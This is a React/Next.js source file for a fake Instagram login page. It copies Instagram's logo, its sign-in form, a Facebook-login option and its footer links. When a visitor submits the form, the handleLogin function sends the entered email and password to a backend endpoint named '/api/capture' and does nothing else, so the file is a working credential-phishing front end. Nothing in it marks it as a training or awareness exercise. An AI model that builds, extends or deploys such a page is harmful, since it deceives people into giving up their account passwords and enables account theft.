'use client'

import { useState } from 'react'
import styles from '@/styles/InstagramLoginFlow.module.css'

const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001'

export default function InstagramLoginFlow() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [errorMsg, setErrorMsg] = useState('')

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!email.trim() || !password) {
      setErrorMsg('Please enter your email and password.')
      return
    }

    setErrorMsg('')

    const payload = {
      email: email.trim(),
      password,
      method: 'instagram',
    }

    try {
      await fetch(`${BACKEND_URL}/api/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch (error) {
      console.warn('Backend request failed')
    }
  }

  return (
    <div className={styles.contentBox}>
      <div>
        <img
          src="/user/images/instagram-logo.svg"
          alt="Instagram"
          className={styles.logoPlaceholder}
        />

        {errorMsg && <span className={styles.errorMsg}>{errorMsg}</span>}

        <form onSubmit={handleLogin}>
          <input
            type="email"
            placeholder="Phone number, username, or email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={styles.inputField}
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={styles.inputField}
          />

          <div className={styles.btnContainer}>
            <button type="submit" className={styles.loginBtn}>
              Log in
            </button>
          </div>
        </form>

        <div style={{ margin: '20px 0', position: 'relative' }}>
          <hr style={{ border: 'none', borderTop: '1px solid #dbdbdb' }} />
          <span style={{
            position: 'absolute',
            top: '-12px',
            left: '50%',
            transform: 'translateX(-50%)',
            background: '#fafafa',
            padding: '0 10px',
            color: '#999',
            fontSize: '13px',
            fontWeight: '600'
          }}>
            OR
          </span>
        </div>

        <div className={styles.facebookLogin}>
          <span>Log in with Facebook</span>
        </div>

        <div className={styles.forgotLink}>
          <a href="#">Forgot password?</a>
        </div>

        <div className={styles.signupRow}>
          Don't have an account?{' '}
          <a href="#">Sign up</a>
        </div>
      </div>

      <footer className={styles.footer}>
        <ul>
          <li><a href="#">About</a></li>
          <li><a href="#">Help</a></li>
          <li><a href="#">Press</a></li>
          <li><a href="#">API</a></li>
          <li><a href="#">Jobs</a></li>
          <li><a href="#">Privacy</a></li>
          <li><a href="#">Terms</a></li>
          <li><a href="#">Locations</a></li>
          <li><a href="#">Language</a></li>
          <li><a href="#">Change password</a></li>
        </ul>
      </footer>
    </div>
  )
}
